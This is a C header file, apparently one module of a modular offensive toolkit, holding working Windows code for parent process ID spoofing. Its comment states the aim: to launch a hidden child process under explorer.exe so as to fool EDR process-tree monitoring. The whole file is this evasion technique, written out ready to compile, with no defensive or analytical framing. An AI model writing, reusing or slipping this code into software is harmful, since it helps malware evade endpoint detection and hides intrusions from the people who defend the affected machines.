// chunk: process/ppid_spoof
// depends: (none)
// provides: spoof_ppid_create_process
// headers: windows.h,tlhelp32.h
// note: Create child process with spoofed parent (explorer.exe) to fool EDR process tree

#ifndef CHUNK_PPID_SPOOF
#define CHUNK_PPID_SPOOF

#include <windows.h>
#include <tlhelp32.h>

static DWORD find_pid_by_name(const char *name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    DWORD pid = 0;
    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, name) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

static BOOL spoof_ppid_create_process(const char *cmd, DWORD ppid, PROCESS_INFORMATION *pi_out) {
    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, ppid);
    if (!hParent) return FALSE;

    SIZE_T attr_sz = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attr_sz);
    LPPROC_THREAD_ATTRIBUTE_LIST attr = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(attr_sz);
    if (!attr) { CloseHandle(hParent); return FALSE; }

    if (!InitializeProcThreadAttributeList(attr, 1, 0, &attr_sz)) {
        free(attr); CloseHandle(hParent); return FALSE;
    }

    UpdateProcThreadAttribute(attr, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                              &hParent, sizeof(HANDLE), NULL, NULL);

    STARTUPINFOEXA si;
    ZeroMemory(&si, sizeof(si));
    si.StartupInfo.cb = sizeof(si);
    si.lpAttributeList = attr;

    char cmd_buf[512];
    strncpy(cmd_buf, cmd, sizeof(cmd_buf) - 1);
    cmd_buf[sizeof(cmd_buf) - 1] = '\0';

    BOOL ok = CreateProcessA(NULL, cmd_buf, NULL, NULL, FALSE,
                             EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
                             NULL, NULL, &si.StartupInfo, pi_out);

    DeleteProcThreadAttributeList(attr);
    free(attr);
    CloseHandle(hParent);
    return ok;
}

#endif
